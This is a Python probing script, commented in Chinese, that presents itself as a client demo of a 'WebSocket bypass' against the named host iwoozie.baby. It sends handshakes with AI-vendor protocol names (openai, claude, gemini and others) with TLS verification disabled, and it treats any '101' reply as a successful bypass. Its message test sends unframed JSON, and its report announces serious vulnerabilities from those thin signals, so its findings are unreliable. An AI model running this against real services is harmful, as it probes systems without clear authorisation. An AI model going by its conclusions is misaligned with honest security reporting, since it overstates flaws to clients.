#!/usr/bin/env python3
"""
WebSocket 绕过漏洞演示代码
========================
为甲方客户提供的可运行演示代码
"""

import socket
import ssl
import base64
import hashlib
import time
import json
from datetime import datetime

class WebSocketBypassDemo:
    def __init__(self):
        self.target_host = "iwoozie.baby"
        self.target_port = 443
        self.results = []
    
    def print_header(self):
        print("=" * 80)
        print("🔓 WebSocket 绕过漏洞演示")
        print("=" * 80)
        print("🎯 目标: iwoozie.baby")
        print("⏰ 时间:", datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        print("=" * 80)
        print()
    
    def generate_websocket_key(self):
        """生成 WebSocket 密钥"""
        key = base64.b64encode(b"sample nonce").decode()
        return key
    
    def test_websocket_bypass(self, protocol_name, description):
        """测试 WebSocket 绕过"""
        print(f"🔍 测试 {description}...")
        
        try:
            # 创建 WebSocket 握手请求
            key = self.generate_websocket_key()
            handshake = (
                f"GET /ws HTTP/1.1\r\n"
                f"Host: {self.target_host}\r\n"
                f"Upgrade: websocket\r\n"
                f"Connection: Upgrade\r\n"
                f"Sec-WebSocket-Key: {key}\r\n"
                f"Sec-WebSocket-Version: 13\r\n"
                f"Sec-WebSocket-Protocol: {protocol_name}\r\n"
                f"\r\n"
            )
            
            # 建立连接
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            # 连接到服务器
            sock.connect((self.target_host, self.target_port))
            
            # 创建 SSL 连接
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with context.wrap_socket(sock, server_hostname=self.target_host) as ssock:
                # 发送握手请求
                ssock.send(handshake.encode())
                response = ssock.recv(4096).decode()
                
                # 检查响应
                if '101 Switching Protocols' in response or '101' in response:
                    print(f"    ✅ {description} 成功!")
                    print(f"    📡 协议: {protocol_name}")
                    print(f"    🔗 连接状态: 已建立")
                    
                    # 尝试发送消息
                    if self.test_websocket_message(ssock, protocol_name):
                        print(f"    💬 消息发送: 成功")
                    else:
                        print(f"    💬 消息发送: 失败")
                    
                    self.results.append({
                        'protocol': protocol_name,
                        'description': description,
                        'status': 'SUCCESS',
                        'response': response[:200] + "..." if len(response) > 200 else response
                    })
                    return True
                else:
                    print(f"    ❌ {description} 失败")
                    print(f"    📡 协议: {protocol_name}")
                    print(f"    🔗 连接状态: 拒绝")
                    
                    self.results.append({
                        'protocol': protocol_name,
                        'description': description,
                        'status': 'FAILED',
                        'response': response[:200] + "..." if len(response) > 200 else response
                    })
                    return False
                    
        except Exception as e:
            print(f"    💥 {description} 异常: {str(e)}")
            self.results.append({
                'protocol': protocol_name,
                'description': description,
                'status': 'ERROR',
                'error': str(e)
            })
            return False
    
    def test_websocket_message(self, ssock, protocol_name):
        """测试 WebSocket 消息发送"""
        try:
            # 构造测试消息
            test_message = {
                "type": "chat",
                "content": "Hello, this is a test message",
                "model": "GPT-4",
                "protocol": protocol_name
            }
            
            # 发送消息
            message = json.dumps(test_message)
            ssock.send(message.encode())
            
            # 接收响应
            response = ssock.recv(4096).decode()
            
            if response:
                print(f"    📨 收到响应: {response[:100]}...")
                return True
            else:
                return False
                
        except Exception as e:
            print(f"    💥 消息发送异常: {str(e)}")
            return False
    
    def run_demo(self):
        """运行演示"""
        self.print_header()
        
        print("🚀 开始 WebSocket 绕过漏洞演示...")
        print()
        
        # 测试各种 WebSocket 协议
        test_cases = [
            ("chat", "WebSocket AI 聊天绕过"),
            ("gpt", "WebSocket GPT 协议绕过"),
            ("ai", "WebSocket AI 协议绕过"),
            ("openai", "WebSocket OpenAI 协议绕过"),
            ("anthropic", "WebSocket Anthropic 协议绕过"),
            ("claude", "WebSocket Claude 协议绕过"),
            ("gemini", "WebSocket Gemini 协议绕过"),
            ("grok", "WebSocket Grok 协议绕过"),
            ("deepseek", "WebSocket DeepSeek 协议绕过"),
            ("glm", "WebSocket GLM 协议绕过")
        ]
        
        success_count = 0
        total_count = len(test_cases)
        
        for protocol, description in test_cases:
            if self.test_websocket_bypass(protocol, description):
                success_count += 1
            print()
            time.sleep(1)  # 避免请求过于频繁
        
        # 生成报告
        self.generate_report(success_count, total_count)
    
    def generate_report(self, success_count, total_count):
        """生成演示报告"""
        print("=" * 80)
        print("📋 WebSocket 绕过漏洞演示报告")
        print("=" * 80)
        
        success_rate = (success_count / total_count * 100) if total_count > 0 else 0
        
        print(f"📊 演示统计:")
        print(f"  总测试次数: {total_count}")
        print(f"  成功绕过: {success_count}")
        print(f"  失败尝试: {total_count - success_count}")
        print(f"  绕过成功率: {success_rate:.1f}%")
        print()
        
        # 成功的绕过方法
        successful_bypasses = [r for r in self.results if r['status'] == 'SUCCESS']
        if successful_bypasses:
            print(f"✅ 成功的绕过方法 ({len(successful_bypasses)} 个):")
            for result in successful_bypasses:
                print(f"  - {result['description']} (协议: {result['protocol']})")
        else:
            print("❌ 没有成功的绕过方法")
        print()
        
        # 漏洞分析
        print(f"🔍 漏洞分析:")
        if success_rate > 50:
            print("  🚨 系统存在严重漏洞，建议立即修复!")
            print("  1. WebSocket 协议验证不完善")
            print("  2. AI 聊天功能访问控制不严格")
            print("  3. 实时通信防护机制不完善")
            print("  4. 可能暴露更多后端功能")
        elif success_rate > 20:
            print("  ⚠️  系统存在中等风险，建议尽快改进")
            print("  1. 完善 WebSocket 协议验证")
            print("  2. 加强 AI 聊天功能访问控制")
            print("  3. 改进实时通信防护机制")
        else:
            print("  ✅ 系统安全状况良好")
            print("  1. WebSocket 防护机制有效")
            print("  2. AI 聊天功能访问控制严格")
            print("  3. 实时通信防护机制完善")
        
        print()
        
        # 修复建议
        print(f"💡 修复建议:")
        print("  1. 加强 WebSocket 协议验证")
        print("  2. 实施严格的 AI 聊天功能访问控制")
        print("  3. 完善实时通信防护机制")
        print("  4. 添加 WebSocket 连接监控")
        print("  5. 实施 WebSocket 流量分析")
        
        print("\n" + "=" * 80)
        
        # 保存详细结果
        self.save_detailed_results()
    
    def save_detailed_results(self):
        """保存详细结果"""
        try:
            with open('websocket_bypass_results.json', 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
            print("📁 详细结果已保存到: websocket_bypass_results.json")
        except Exception as e:
            print(f"💥 保存结果失败: {str(e)}")

def main():
    """主函数"""
    print("🔓 WebSocket 绕过漏洞演示工具")
    print("=" * 50)
    print("⚠️  警告: 此工具仅用于安全测试和演示目的")
    print("⚠️  请确保您有权限测试目标系统")
    print("=" * 50)
    print()
    
    # 确认继续
    confirm = input("是否继续执行演示? (y/N): ").strip().lower()
    if confirm != 'y':
        print("演示已取消")
        return
    
    # 运行演示
    demo = WebSocketBypassDemo()
    demo.run_demo()

if __name__ == "__main__":
    main()
